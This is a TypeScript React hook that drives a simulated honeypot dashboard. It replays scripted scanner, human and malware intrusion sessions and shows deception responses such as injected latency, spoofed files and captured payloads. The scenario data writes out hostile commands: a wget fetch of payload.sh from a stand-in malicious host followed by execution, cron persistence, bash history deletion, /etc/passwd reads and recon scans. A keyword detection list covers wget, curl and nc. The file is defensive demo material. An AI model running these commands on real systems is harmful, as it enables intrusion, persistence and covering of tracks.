import { useState, useRef, useEffect, useCallback } from 'react';

export type ProfileType = 'scanner' | 'human' | 'malware' | null;

export interface StateVector {
  numCommands: number;
  timeAlive: number;
  uniqueCommands: number;
  lastCommand: number;
  repetitiveInput: number;
  commandType: number;
}

export interface TerminalLine {
  id: string;
  text: string;
  type: 'input' | 'output';
}

export interface PolicyAction {
  id: number;
  name: string;
  color: string;
  bg: string;
  border: string;
}

export interface AdminMessage {
  id: string;
  text: string;
  type: 'info' | 'alert' | 'success';
}

const currentDateParts = new Date().toString().split(' ');
const formattedDate = `${currentDateParts[0]} ${currentDateParts[1]} ${currentDateParts[2]} ${currentDateParts[4]} ${currentDateParts[3]}`;

const SSH_PREFIX = [
  { type: 'input', text: 'ssh root@192.168.1.100', delay: 500 },
  { type: 'output', text: "root@192.168.1.100's password:", delay: 800 },
  { type: 'output', text: `Last login: ${formattedDate} from 10.0.0.4`, delay: 1200 }
];

export const SCENARIOS = {
  scanner: [
    ...SSH_PREFIX,
    { type: 'policy', policy: { id: 0, name: 'Action 0: Injecting Latency', color: 'text-yellow-400', bg: 'bg-yellow-400/10', border: 'border-yellow-400' }, delay: 200 },
    { type: 'input', text: 'nmap -sV 192.168.1.0/24', delay: 500, state: { numCommands: 1, uniqueCommands: 1, commandType: 3, lastCommand: 42, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'nmap -sV 192.168.1.0/24', action: 'Injecting Latency', fakeData: 'Artificially delayed TCP handshake by 1500ms' }, delay: 100 },
    { type: 'output', text: 'Starting Nmap 7.80 ( https://nmap.org )', delay: 2500, sqs: 5 },
    { type: 'output', text: 'Nmap scan report for 192.168.1.100', delay: 2000, sqs: 10 },
    { type: 'input', text: 'nc -v 192.168.1.100 22', delay: 500, state: { numCommands: 2, uniqueCommands: 2, commandType: 3, lastCommand: 88, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'nc -v 192.168.1.100 22', action: 'Injecting Latency', fakeData: 'Artificially delayed TCP handshake by 1500ms' }, delay: 100 },
    { type: 'output', text: 'Connection to 192.168.1.100 22 port [tcp/ssh] succeeded!', delay: 3500, sqs: 15 },
    { type: 'input', text: 'masscan -p22,80,443 --rate=1000 192.168.1.0/24', delay: 500, state: { numCommands: 3, uniqueCommands: 3, commandType: 3, lastCommand: 12, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'masscan -p22,80,443 --rate=1000 192.168.1.0/24', action: 'Injecting Latency', fakeData: 'Artificially delayed SYN-ACK responses by variable ms' }, delay: 100 },
    { type: 'output', text: 'Waiting for responses...', delay: 3000, sqs: 25 },
    { type: 'output', text: 'Discovered open port 22/tcp on 192.168.1.100', delay: 1000, sqs: 30 },
    { type: 'input', text: 'nmap -sV 192.168.1.0/24', delay: 1000, state: { numCommands: 4, uniqueCommands: 3, commandType: 3, lastCommand: 42, repetitiveInput: 1 } },
    { type: 'deception', log: { command: 'nmap -sV 192.168.1.0/24', action: 'Injecting Latency', fakeData: 'Tarpit engaged. Holding connections open.' }, delay: 100 },
    { type: 'output', text: 'Starting Nmap 7.80...', delay: 4000, sqs: 40 },
    { type: 'input', text: 'dirb http://192.168.1.100/', delay: 1000, state: { numCommands: 5, uniqueCommands: 4, commandType: 3, lastCommand: 23, repetitiveInput: 1 } },
    { type: 'deception', log: { command: 'dirb http://192.168.1.100/', action: 'Injecting Latency', fakeData: 'HTTP stalling enabled. Slowly streaming response headers.' }, delay: 100 },
    { type: 'output', text: '-----------------\nDIRB v2.22    \nBy The Dark Raver\n-----------------\n\nSTART_TIME: ' + formattedDate + '\nURL_BASE: http://192.168.1.100/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612\n\n----\nScanning URL: http://192.168.1.100/ ----', delay: 3500, sqs: 55 },
    { type: 'input', text: 'nikto -h 192.168.1.100', delay: 2000, state: { numCommands: 6, uniqueCommands: 5, commandType: 3, lastCommand: 47, repetitiveInput: 1 } },
    { type: 'deception', log: { command: 'nikto -h 192.168.1.100', action: 'Environment Modification', fakeData: 'Feeding dummy Apache 2.4.41 vulnerability signatures' }, delay: 100 },
    { type: 'output', text: '- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          192.168.1.100\n+ Target Hostname:    192.168.1.100\n+ Target Port:        80\n+ Start Time:         ' + formattedDate + '\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.41 (Ubuntu)', delay: 4000, sqs: 75 },
    { type: 'admin', text: 'Scan sequence stalled and signature fed successfully.', delay: 500, sqs: 85 }
  ],
  human: [
    ...SSH_PREFIX,
    { type: 'policy', policy: { id: 2, name: 'Action 2: Environment Modification', color: 'text-blue-400', bg: 'bg-blue-400/10', border: 'border-blue-400' }, delay: 200 },
    { type: 'input', text: 'whoami', delay: 1500, state: { numCommands: 1, uniqueCommands: 1, commandType: 1, lastCommand: 91, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'whoami', action: 'Environment Modification', fakeData: 'Spoofed Ubuntu 22.04 filesystem and synthetic password hashes' }, delay: 100 },
    { type: 'output', text: 'root', delay: 200, sqs: 10 },
    { type: 'input', text: 'cat /etc/passwd', delay: 2500, state: { numCommands: 2, uniqueCommands: 2, commandType: 1, lastCommand: 34, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'cat /etc/passwd', action: 'Environment Modification', fakeData: 'Generated 4 synthetic root users' }, delay: 100 },
    { type: 'output', text: 'root:x:0:0:root:/root:/bin/bash\nfakeuser:x:1001:1001::/home/fakeuser:/bin/sh\nadmin:x:1002:1002::/home/admin:/bin/bash', delay: 400, sqs: 20 },
    { type: 'input', text: 'ls -la /root', delay: 3500, state: { numCommands: 3, uniqueCommands: 3, commandType: 1, lastCommand: 55, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'ls -la /root', action: 'Environment Modification', fakeData: 'Injected simulated honeyfiles (passwords_backup.txt)' }, delay: 100 },
    { type: 'output', text: 'total 32\ndrwx------  4 root root 4096 Oct 12 10:00 .\ndrwxr-xr-x 19 root root 4096 Oct 12 09:15 ..\n-rw-------  1 root root  128 Oct 12 10:01 .bash_history\n-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc\n-rw-------  1 root root   45 Oct 12 09:30 passwords_backup.txt\ndrwxr-xr-x  2 root root 4096 Oct 12 09:50 .ssh', delay: 500, sqs: 40 },
    { type: 'input', text: 'cat /root/passwords_backup.txt', delay: 4000, state: { numCommands: 4, uniqueCommands: 4, commandType: 1, lastCommand: 77, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'cat /root/passwords_backup.txt', action: 'Environment Modification', fakeData: 'Fed false database credentials to trace attacker movement' }, delay: 100 },
    { type: 'output', text: 'db_admin: P@ssw0rd123!\napi_key: AKIAIOSFODNN7EXAMPLE', delay: 600, sqs: 60 },
    { type: 'input', text: 'uname -a', delay: 2000, state: { numCommands: 5, uniqueCommands: 5, commandType: 1, lastCommand: 81, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'uname -a', action: 'Environment Modification', fakeData: 'Spoofed kernel version string' }, delay: 100 },
    { type: 'output', text: 'Linux server 5.15.0-76-generic #83-Ubuntu SMP Thu Jun 15 19:16:32 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux', delay: 300, sqs: 65 },
    { type: 'input', text: 'ifconfig', delay: 1500, state: { numCommands: 6, uniqueCommands: 6, commandType: 1, lastCommand: 33, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'ifconfig', action: 'Environment Modification', fakeData: 'Spoofed internal isolated IP schema' }, delay: 100 },
    { type: 'output', text: 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.0.0.12  netmask 255.255.255.0  broadcast 10.0.0.255\n        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)', delay: 400, sqs: 75 },
    { type: 'input', text: 'ps aux | grep root', delay: 3000, state: { numCommands: 7, uniqueCommands: 7, commandType: 1, lastCommand: 92, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'ps aux | grep root', action: 'Environment Modification', fakeData: 'Hidden hypervisor background processes' }, delay: 100 },
    { type: 'output', text: 'root         1  0.0  0.1  10280  4688 ?        Ss   08:29   0:00 /sbin/init\nroot        42  0.0  0.0   2888   976 ?        Ss   08:31   0:00 /usr/sbin/cron -f', delay: 600, sqs: 85 },
    { type: 'admin', text: 'Human traversal identified and contained within isolated VM ring.', delay: 500, sqs: 100 }
  ],
  malware: [
    ...SSH_PREFIX,
    { type: 'policy', policy: { id: 1, name: 'Action 1: Normal Execution', color: 'text-red-500', bg: 'bg-red-500/10', border: 'border-red-500' }, delay: 200 },
    { type: 'input', text: 'wget http://malicious-distribution-node/payload.sh', delay: 1000, state: { numCommands: 1, uniqueCommands: 1, commandType: 2, lastCommand: 11, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'wget http://malicious-distribution-node/payload.sh', action: 'Normal Execution', fakeData: 'None. Allowed execution to capture binary in staging vault' }, delay: 100 },
    { type: 'output', text: '--2023-10-12 10:05:22--  http://malicious-distribution-node/payload.sh\nResolving malicious-distribution-node... 198.51.100.23\nConnecting to malicious-distribution-node|198.51.100.23|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1048 (1.0K) [application/x-sh]\nSaving to: ‘payload.sh’\n\npayload.sh          100%[===================>]   1.02K  --.-KB/s    in 0s      \n\n2023-10-12 10:05:22 (11.4 MB/s) - ‘payload.sh’ saved [1048/1048]', delay: 0, sqs: 30 },
    { type: 'input', text: 'chmod +x payload.sh', delay: 1500, state: { numCommands: 2, uniqueCommands: 2, commandType: 2, lastCommand: 15, repetitiveInput: 0 } },
    { type: 'output', text: '', delay: 0, sqs: 50 },
    { type: 'input', text: './payload.sh', delay: 1000, state: { numCommands: 3, uniqueCommands: 3, commandType: 2, lastCommand: 99, repetitiveInput: 0 } },
    { type: 'deception', log: { command: './payload.sh', action: 'Normal Execution', fakeData: 'Isolated process execution. Recording system calls via ptrace.' }, delay: 100 },
    { type: 'output', text: 'Executing payload...', delay: 0, sqs: 70 },
    { type: 'admin', text: 'Intrusion Captured: Binary isolated in staging vault. Session Quality Score Maximized.', delay: 500, sqs: 90 },
    { type: 'input', text: 'crontab -l', delay: 2000, state: { numCommands: 4, uniqueCommands: 4, commandType: 2, lastCommand: 17, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'crontab -l', action: 'Environment Modification', fakeData: 'Returned empty synthetic crontab' }, delay: 100 },
    { type: 'output', text: 'no crontab for root', delay: 200, sqs: 92 },
    { type: 'input', text: 'echo "*/5 * * * * root /tmp/payload.sh" >> /etc/crontab', delay: 2000, state: { numCommands: 5, uniqueCommands: 5, commandType: 2, lastCommand: 44, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'echo "*/5 * * * * root /tmp/payload.sh" >> /etc/crontab', action: 'Normal Execution', fakeData: 'Allowed crontab modification in ephemeral state' }, delay: 100 },
    { type: 'output', text: '', delay: 50, sqs: 95 },
    { type: 'input', text: 'rm ~/.bash_history', delay: 1500, state: { numCommands: 6, uniqueCommands: 6, commandType: 2, lastCommand: 81, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'rm ~/.bash_history', action: 'Environment Modification', fakeData: 'Simulated deletion. True history persists.' }, delay: 100 },
    { type: 'output', text: '', delay: 100, sqs: 100 }
  ],
  manual: [
    ...SSH_PREFIX
  ]
};

export function useSimulation() {
  const [profile, setProfile] = useState<ProfileType>(null);

  const [lines, setLines] = useState<TerminalLine[]>([]);
  const [stateVector, setStateVector] = useState<StateVector>({
    numCommands: 0, timeAlive: 0, uniqueCommands: 0, lastCommand: 0, repetitiveInput: 0, commandType: 0
  });
  const [policy, setPolicy] = useState<PolicyAction | null>(null);
  const [sqs, setSqs] = useState(0);
  const [adminMsg, setAdminMsg] = useState<AdminMessage | null>(null);
  const [deceptionLogs, setDeceptionLogs] = useState<{ id: string; command: string; action: string; fakeData: string }[]>([]);
  const [isTyping, setIsTyping] = useState(false);
  const [currentInputText, setCurrentInputText] = useState('');

  const timeoutRefs = useRef<number[]>([]);

  const clearTimeouts = () => {
    timeoutRefs.current.forEach(clearTimeout);
    timeoutRefs.current = [];
  };

  const exportCSV = useCallback(() => {
    if (!profile) return;
    const header = "Timestamp,Profile,Command,Action,FakeData,LastCommandHash,SQS\n";
    const rows = deceptionLogs.map(log => 
      `${new Date().toISOString()},${profile},"${log.command}","${log.action}","${log.fakeData}",${stateVector.lastCommand},${sqs.toFixed(1)}`
    ).join('\n');
    const csvContent = "data:text/csv;charset=utf-8," + header + rows;
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", `session_${profile}_${new Date().getTime()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }, [profile, deceptionLogs, stateVector, sqs]);

  const handleManualCommand = useCallback((command: string) => {
    if (!command.trim()) return;
    
    setLines(l => [...l, { id: Math.random().toString(), text: command, type: 'input' }]);

    const isMalware = command.includes('wget') || command.includes('curl') || command.includes('chmod') || command.includes('./');
    const isScan = command.includes('nmap') || command.includes('nc') || command.includes('masscan');
    
    let action = 'Normal Execution';
    let fakeData = 'Command executed normally';
    let policyId = 1;
    let color = 'text-red-500';
    let bg = 'bg-red-500/10';
    let border = 'border-red-500';
    let sqsInc = 5;
    
    if (isScan) {
      action = 'Injecting Latency';
      fakeData = 'Artificially delayed TCP handshake by 800ms';
      policyId = 0;
      color = 'text-yellow-400';
      bg = 'bg-yellow-400/10';
      border = 'border-yellow-400';
      sqsInc = 2;
    } else if (isMalware) {
      action = 'Normal Execution';
      fakeData = 'Allowed execution to capture binary in staging vault';
      sqsInc = 15;
    } else {
      action = 'Environment Modification';
      fakeData = 'Generated synthetic files and masked real directories';
      policyId = 2;
      color = 'text-blue-400';
      bg = 'bg-blue-400/10';
      border = 'border-blue-400';
      sqsInc = 8;
    }

    setPolicy({
      id: policyId,
      name: `Action ${policyId}: ${action}`,
      color,
      bg,
      border
    });

    setDeceptionLogs(l => [...l, {
      id: Math.random().toString(),
      command,
      action,
      fakeData
    }]);

    setStateVector(s => ({
      ...s,
      numCommands: s.numCommands + 1,
      uniqueCommands: s.uniqueCommands + (Math.random() > 0.3 ? 1 : 0),
      lastCommand: Math.abs(command.split('').reduce((a, b) => { a = ((a << 5) - a) + b.charCodeAt(0); return a & a }, 0)) % 1000,
      commandType: isScan ? 3 : isMalware ? 2 : (command.includes('ls') || command.includes('cat') || command.includes('whoami') ? 1 : 0),
    }));
    
    setSqs(s => Math.min(100, s + sqsInc));
    
    setTimeout(() => {
      let outputText = '';
      if (isScan) outputText = 'Starting scan... done.\n192.168.1.100 - open ports: 22, 80';
      else if (isMalware) outputText = command.includes('wget') ? 'Saving to: payload.sh\n100%[===================>] 1,024  --.-KB/s' : '';
      else if (command.includes('ls')) outputText = 'total 32\ndrwxr-xr-x 2 root root 4096 Oct 12 10:00 .\n-rw-r--r-- 1 root root  128 Oct 12 10:01 passwords';
      else if (command.includes('whoami')) outputText = 'root';
      else if (command.includes('cat')) outputText = 'root:x:0:0:root:/root:/bin/bash\noperator:x:1000:1000::/home/operator:/bin/sh';
      else outputText = 'bash: ' + command.split(' ')[0] + ': command not found';
      
      if (outputText) {
        setLines(l => [...l, { id: Math.random().toString(), text: outputText, type: 'output' }]);
      }
    }, isScan ? 800 : 200);

  }, []);

  const startSimulation = useCallback((prof: ProfileType) => {
    if (!prof) return;
    setProfile(prof);
    setLines([]);
    setStateVector({
      numCommands: 0, timeAlive: 0, uniqueCommands: 0, lastCommand: 0, repetitiveInput: 0, commandType: 0
    });
    setPolicy(null);
    setSqs(0);
    setAdminMsg(null);
    setDeceptionLogs([]);
    setIsTyping(false);
    setCurrentInputText('');
    clearTimeouts();

    const scenario = SCENARIOS[prof];
    let aggregatedDelay = 0;
    
    // Time alive ticker
    const ticker = setInterval(() => {
      setStateVector(s => ({ ...s, timeAlive: s.timeAlive + 1 }));
    }, 1000);
    timeoutRefs.current.push(ticker as any);

    scenario.forEach((step: any) => {
      aggregatedDelay += step.delay || 0;
      
      if (step.type === 'policy') {
        const t = setTimeout(() => {
          setPolicy(step.policy as PolicyAction);
        }, aggregatedDelay);
        timeoutRefs.current.push(t as any);
      } else if (step.type === 'input') {
        const tStart = setTimeout(() => {
          setIsTyping(true);
          if (step.state) setStateVector(s => ({ ...s, ...step.state }));
          
          const text = step.text || '';
          let charIdx = 0;
          
          const typeNextChar = () => {
            setCurrentInputText(text.slice(0, charIdx + 1));
            charIdx++;
            if (charIdx >= text.length) {
              setIsTyping(false);
              setCurrentInputText('');
              setLines(l => [...l, { id: Math.random().toString(), text, type: 'input' }]);
            } else {
              const delay = prof === 'human' ? Math.random() * 80 : 10;
              const nextTimer = setTimeout(typeNextChar, delay);
              timeoutRefs.current.push(nextTimer as any);
            }
          };

          const firstDelay = prof === 'human' ? Math.random() * 80 : 10;
          const firstTimer = setTimeout(typeNextChar, firstDelay);
          timeoutRefs.current.push(firstTimer as any);
          
        }, aggregatedDelay);
        aggregatedDelay += (step.text?.length || 0) * (prof === 'scanner' ? 10 : 40);
        timeoutRefs.current.push(tStart as any);
      } else if (step.type === 'output') {
        const t = setTimeout(() => {
          setLines(l => [...l, { id: Math.random().toString(), text: step.text || '', type: 'output' }]);
          if (step.sqs !== undefined) setSqs(step.sqs);
        }, aggregatedDelay);
        timeoutRefs.current.push(t as any);
      } else if (step.type === 'admin') {
        const t = setTimeout(() => {
          setAdminMsg({ id: Math.random().toString(), text: step.text || '', type: 'alert' });
          if (step.sqs !== undefined) setSqs(step.sqs);
        }, aggregatedDelay);
        timeoutRefs.current.push(t as any);
      } else if (step.type === 'deception') {
        const t = setTimeout(() => {
          setDeceptionLogs(l => [...l, { id: Math.random().toString(), ...step.log }]);
        }, aggregatedDelay);
        timeoutRefs.current.push(t as any);
      }
    });

  }, []);

  useEffect(() => {
    return () => clearTimeouts();
  }, []);

  return {
    profile, lines, currentInputText, isTyping, stateVector, policy, sqs, adminMsg, deceptionLogs, startSimulation, exportCSV, handleManualCommand
  };
}
